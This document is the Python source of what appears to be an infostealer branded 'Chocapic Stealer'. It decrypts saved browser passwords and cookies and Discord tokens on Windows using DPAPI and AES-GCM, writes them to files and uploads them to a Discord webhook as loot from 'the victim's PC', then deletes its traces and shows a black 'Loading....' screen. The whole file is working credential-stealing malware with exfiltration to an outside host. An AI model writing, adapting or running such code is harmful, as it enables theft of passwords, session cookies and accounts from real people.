# Needed libraries
import os
if os.name != "nt": # If the OS is not windows
    exit() # Exit the program.
import re
import sys
import pygame
import win32crypt
import custom_webhook

from discord_webhook import DiscordWebhook, DiscordEmbed
from base64 import b64decode
from json import loads
from shutil import copy2
from sqlite3 import connect
from tkinter import font
from Cryptodome.Cipher import AES
from requests import post



def GameStealer(): # Game function, it'll block the screen by showing a black screen.
    
    # Screen size
    
    WI = 1920
    HE = 1080
    FPS = 60

    # Some debug (not really required)
    def debug(info,y=10,x=10):
        font = pygame.font.Font(None,30)
        display_surface = pygame.display.get_surface()
        debug_surf = font.render(str(info), True,"White")
        debug_rect = debug_surf.get_rect(topleft=(x,y))
        pygame.draw.rect(display_surface, "Black", debug_rect)
        display_surface.blit(debug_surf,debug_rect)

    # Main game class
    class Game:
        def __init__(self):
            pygame.init()
            self.screen = pygame.display.set_mode((WI,HE))
            self.clock = pygame.time.Clock
        
        def run(self):
            while True:
                for event in pygame.event.get():
                    if event.type == pygame.QUIT:
                        pygame.quit()
                        sys.exit()
                
                self.screen.fill("black")
                pygame.display.update()
                debug("Loading....")

    if __name__ == "__main__": # Main function running.
        game = Game()
        game.run()

localappdata = os.getenv('LOCALAPPDATA') # Define path as localappdata
roaming_appdata = os.getenv('APPDATA') # Define path as roaming_appdata

tokenPaths = { # Define paths
    "Discord": f"{roaming_appdata}\\Discord",
    "Lightcord": f"{roaming_appdata}\\Lightcord\\Local Storage\\leveldb\\",
    "Discord Canary": f"{roaming_appdata}\\discordcanary",
    "Discord PTB": f"{roaming_appdata}\\discordptb",
    "Google Chrome": f"{localappdata}\\Google\\Chrome\\User Data\\Default",
    "Opera": f"{roaming_appdata}\\Opera Software\\Opera Stable",
    "Brave": f"{localappdata}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": f"{localappdata}\\Yandex\\YandexBrowser\\User Data\\Default",
    "OperaGX": f"{roaming_appdata}\\Opera Software\\Opera GX Stable"
}


browser_loc = { # Sonme browser's paths
    "Chrome": f"{localappdata}\\Google\\Chrome",
    "Brave": f"{localappdata}\\BraveSoftware\\Brave-Browser",
    "Edge": f"{localappdata}\\Microsoft\\Edge",
    "Opera": f"{roaming_appdata}\\Opera Software\\Opera Stable",
    "OperaGX": f"{roaming_appdata}\\Opera Software\\Opera GX Stable",
    'Amigo': f"{localappdata}\\Amigo\\User Data\\Local Storage\\leveldb\\",
    'Torch': f"{localappdata}\\Torch\\User Data\\Local Storage\\leveldb\\",
    'Kometa': f"{localappdata}\\Kometa\\User Data\\Local Storage\\leveldb\\",
    'Orbitum': f"{localappdata}\\Orbitum\\User Data\\Local Storage\\leveldb\\",
    'CentBrowser': f"{localappdata}\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
    '7Star': f"{localappdata}\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
    'Sputnik': f"{localappdata}\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
    'Vivaldi': f"{localappdata}\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
    'Chrome SxS': f"{localappdata}\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
    'Epic Privacy Browser': f"{localappdata}\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
    'Microsoft Edge': f"{localappdata}\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",
    'Uran': f"{localappdata}\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
    'Yandex': f"{localappdata}\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
    'Brave': f"{localappdata}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
    'Iridium': f"{localappdata}\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\"
}

# Files found

fileCookies = "cookies_system_" + os.getlogin() + ".txt" 
filePass = "passwords_system_" + os.getlogin() + ".txt"
fileInfo = "information_system_" + os.getlogin() + ".txt"

# Finding the chrome users.

for i in os.listdir(browser_loc['Chrome'] + "\\User Data"):
    if i.startswith("Profile "):
        browser_loc["ChromeP"] = f"{localappdata}\\Google\\Chrome\\User Data\\{i}"

# Decrypting the discord tokens

def decrypt_token(buff, master_key):
    try:
        return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM,
                       buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        pass

# Get the discord tokens.

def get_tokens(path):
    cleaned = []
    tokens = []
    done = []
    lev_db = f"{path}\\Local Storage\\leveldb\\"
    loc_state = f"{path}\\Local State"
    if os.path.exists(loc_state):
        with open(loc_state, "r") as file:
            key = loads(file.read())['os_crypt']['encrypted_key']
        for file in os.listdir(lev_db):
            if not file.endswith(".ldb") and file.endswith(".log"):
                continue
            else:
                try:
                    with open(lev_db + file, "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError:
                    continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            done += [decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])]

    else: 
        for file_name in os.listdir(path):
            try:
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            done.append(token)
            except:
                continue

    return done



def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def decrypt_browser(LocalState, LoginData, CookiesFile, name):
    if os.path.exists(LocalState):
        with open(LocalState) as f:
            local_state = f.read()
            local_state = loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

        if os.path.exists(LoginData):
            copy2(LoginData, "TempMan.db")
            with connect("TempMan.db") as conn:
                cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            with open(filePass, "a") as f:
                f.write(f"*** {name} ***\n")
            for index, logins in enumerate(cur.fetchall()):
                try:
                    if not logins[0]:
                        continue
                    if not logins[1]:
                        continue
                    if not logins[2]:
                        continue
                    ciphers = logins[2]
                    init_vector = ciphers[3:15]
                    enc_pass = ciphers[15:-16]

                    cipher = generate_cipher(master_key, init_vector)
                    dec_pass = decrypt_payload(cipher, enc_pass).decode()
                    to_print = f"URL : {logins[0]}\nName: {logins[1]}\nPass: {dec_pass}\n\n"
                    with open(filePass, "a") as f:
                        f.write(to_print)
                except (Exception, FileNotFoundError):
                    pass
        else:
            with open(fileInfo, "a") as f:
                f.write(f"{name} Login Data file missing\n")
        if os.path.exists(CookiesFile):
            copy2(CookiesFile, "CookMe.db")
            with connect("CookMe.db") as conn:
                curr = conn.cursor()
            curr.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
            with open(fileCookies, "a") as f:
                f.write(f"++++ {name} ++++\n")
            for index, cookies in enumerate(curr.fetchall()):
                try:
                    if not cookies[0]:
                        continue
                    if not cookies[1]:
                        continue
                    if not cookies[2]:
                        continue
                    if "google" in cookies[0]:
                        continue
                    ciphers = cookies[2]
                    init_vector = ciphers[3:15]
                    enc_pass = ciphers[15:-16]
                    cipher = generate_cipher(master_key, init_vector)
                    dec_pass = decrypt_payload(cipher, enc_pass).decode()
                    to_print = f'URL : {cookies[0]}\nName: {cookies[1]}\nCook: {dec_pass}\n\n'
                    with open(fileCookies, "a") as f:
                        f.write(to_print)
                except (Exception, FileNotFoundError):
                    pass
        else:
            with open(fileInfo, "a") as f:
                f.write(f"no {name} Cookie file\n")
    else:
        with open(fileInfo, "a") as f:
            f.write(f"{name} Local State file missing\n")



def Local_State(path):
    return f"{path}\\User Data\\Local State"


def Login_Data(path):
    if "Profile" in path:
        return f"{path}\\Login Data"
    else:
        return f"{path}\\User Data\\Default\\Login Data"


def Cookies(path):
    if "Profile" in path:
        return f"{path}\\Network\\Cookies"
    else:
        return f"{path}\\User Data\\Default\\Network\\Cookies"


def main_tokens():
    for platform, path in tokenPaths.items():
        if not os.path.exists(path):
            continue
        try:
            tokens = set(get_tokens(path))
        except:
            continue
        if not tokens:
            continue
        with open(fileInfo, "a") as f:
            for i in tokens:
                f.write(str(i) + "\n")


def decrypt_files(path, browser):
    if os.path.exists(path):
        decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), browser)
    else:
        with open(fileInfo, "a") as f:
            f.write(browser + " isn't installed!\n")



# This function will send the data. You can also use discord_webhook.py to send the data to discord.

def post_to(file):
    webhook_url = custom_webhook.DISCORD_WEBHOOK  # Define webhook URL
    if len(webhook_url) < 10 or webhook_url == "Enter your webhook URL":
        exit()
    else:
        data ={
        "username": "Chocapic Stealer",
        "avatar_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTDoTTZz4U5OzRI6ntXNvzGLzsNNnn8jYEfmGpaiWcrSd0iddX5l8omzuk2kSUgaqRXjb0&usqp=CAU",
        "content": "Hey! I've found this into the victim's PC:",
        "embeds": [
            {
            "title": "Files:",
            "color": 14024959,
            "author": {
                "name": "Chocapic Stealer by Jet",
                "url": "https://github.com/JetBerri",
                "icon_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTDoTTZz4U5OzRI6ntXNvzGLzsNNnn8jYEfmGpaiWcrSd0iddX5l8omzuk2kSUgaqRXjb0&usqp=CAU"
            },
            "image": {
                "url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTDoTTZz4U5OzRI6ntXNvzGLzsNNnn8jYEfmGpaiWcrSd0iddX5l8omzuk2kSUgaqRXjb0&usqp=CAU"
            }
            }
        ],
        "attachments": []
        }

        post(webhook_url, json = data,) # Send to discord
        post(webhook_url, files={'files': open(file, 'rb')}) # Send file


forHandler = (
    fileInfo,
    filePass,
    fileCookies,
    "TempMan.db",
    "CookMe.db"
)


def fileHandler(file):
    if os.path.exists(file):
        if ".txt" in file:
            post_to(file)
        os.remove(file)


def main():
    for name, path in browser_loc.items():
        decrypt_files(path, name)
    main_tokens()
    for i in forHandler:
        fileHandler(i)
    GameStealer()


if __name__ == "__main__":
    main()